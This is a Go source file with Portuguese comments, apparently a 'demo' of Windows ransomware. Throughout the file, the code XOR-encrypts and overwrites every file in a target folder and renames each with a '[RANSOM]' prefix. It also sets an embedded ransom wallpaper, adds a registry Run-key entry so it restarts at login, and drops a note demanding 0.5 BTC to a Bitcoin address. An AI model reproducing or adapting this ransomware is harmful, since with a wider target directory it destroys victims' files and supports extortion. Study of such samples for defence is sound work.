// Este código foi feito por Azam Usman
package main

import (
	_ "embed" // Para embedd de arquivos
	"fmt"
	"os"
	"path/filepath"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

//go:embed wallpaper.png
var wallpaperData []byte // Wallpaper de resgate embutido no executável

const (
	password             = "123"      // Chave de criptografia
	spiSetDeskWallpaper  = 0x0014     // Código para definir papel de parede
	spifUpdateIniFile    = 0x01       // Flag para atualizar INI
	spifSendWinIniChange = 0x02       // Flag para notificar alterações
	targetDir            = `C:\teste` // Pasta alvo para criptografia
)

var (
	user32           = windows.NewLazySystemDLL("user32.dll")  // DLL para funções de UI
	systemParameters = user32.NewProc("SystemParametersInfoW") // Função para definir wallpaper
)

// Função para criptografar dados usando XOR
func xorEncrypt(data []byte) []byte {
	encrypted := make([]byte, len(data))
	for i := range data {
		// Aplica operação XOR com a senha
		encrypted[i] = data[i] ^ password[i%len(password)]
	}
	return encrypted
}

// Define novo papel de parede (de resgate)
func setNewWallpaper() error {
	tempDir := os.TempDir()                                       // Pasta temporária do sistema
	wallpaperPath := filepath.Join(tempDir, "wallpaper_temp.jpg") // Caminho temporário

	// Salva imagem na pasta temporária
	if err := os.WriteFile(wallpaperPath, wallpaperData, 0644); err != nil {
		return fmt.Errorf("erro ao salvar wallpaper: %v", err)
	}

	// Converte caminho para formato UTF-16
	pathUTF16, err := windows.UTF16PtrFromString(wallpaperPath)
	if err != nil {
		return err
	}

	// Chama API para definir novo wallpaper
	ret, _, _ := systemParameters.Call(
		uintptr(spiSetDeskWallpaper),
		0,
		uintptr(unsafe.Pointer(pathUTF16)),
		uintptr(spifUpdateIniFile|spifSendWinIniChange),
	)

	// Remove arquivo temporário
	os.Remove(wallpaperPath)

	if ret == 0 {
		return fmt.Errorf("falha ao definir wallpaper")
	}
	return nil
}

// Adiciona programa à inicialização automática
func addToStartup() {
	exePath := filepath.Join(targetDir, "encryptor.exe") // Caminho do executável
	// Cria/abre chave de registro
	key, _, err := registry.CreateKey(
		registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.SET_VALUE,
	)
	if err != nil {
		return
	}
	defer key.Close()
	// Adiciona entrada de inicialização
	key.SetStringValue("RansomDemo", exePath)
}

func main() {
	// Cria pasta alvo se não existir
	os.MkdirAll(targetDir, 0755)

	// Define novo wallpaper
	if err := setNewWallpaper(); err != nil {
		fmt.Println("[ERRO]", err)
		return
	}

	// Garante execução na próxima inicialização
	addToStartup()

	// Criptografa arquivos na pasta alvo
	filepath.Walk(targetDir, func(path string, info os.FileInfo, err error) error {
		// Ignora erros e pastas
		if err != nil || info.IsDir() {
			return nil
		}

		// Lê conteúdo do arquivo
		data, _ := os.ReadFile(path)
		// Criptografa dados
		encryptedData := xorEncrypt(data)
		// Sobrescreve arquivo com versão criptografada
		os.WriteFile(path, encryptedData, 0644)

		// Renomeia arquivo para indicar criptografia
		newName := "[RANSOM]" + info.Name() + ".aeehh"
		os.Rename(path, filepath.Join(filepath.Dir(path), newName))

		return nil
	})

	// Cria arquivo de resgate
	rescueNote := []byte(`
☠️ TODOS OS SEUS ARQUIVOS FORAM CRIPTOGRAFADOS! ☠️
- PAGUE 0.5 BTC PARA: bc1qxy2kgdygjrsqtzq2n0yrf249fgw2q9u4h2d3tg`)
	os.WriteFile(filepath.Join(targetDir, "!!!WARNING!!!.txt"), rescueNote, 0644)

	// Exibe chave de descriptografia (apenas para demonstração)
	fmt.Println("[+] Sistema comprometido. Chave de resgate:", password)
}
